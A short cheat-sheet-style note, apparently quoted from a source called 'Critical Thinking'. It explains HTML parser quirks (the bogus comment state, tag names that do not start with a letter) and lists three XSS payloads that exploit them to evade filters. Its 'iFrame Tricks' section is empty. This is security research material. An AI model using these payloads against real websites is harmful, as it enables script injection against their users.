From Critical Thinking: 
```
If a closing tag doesn’t match </\[A-Za-z] (e.g. </~), browsers enter the Bogus Comment state and ignore everything until the next >. \<? does the same because of ancient PHP/XML compatibility. That means XSS like these are possible:

Payloads:
</ <a href="><svg/onload=alert(1)>">
<?<a href="><svg/onload=alert(1)>">
```

```
HTML tag names must start with an ASCII letter. 

Payloads:
<0 name="<svg/onload=alert(1)>">
```

iFrame Tricks:
```
```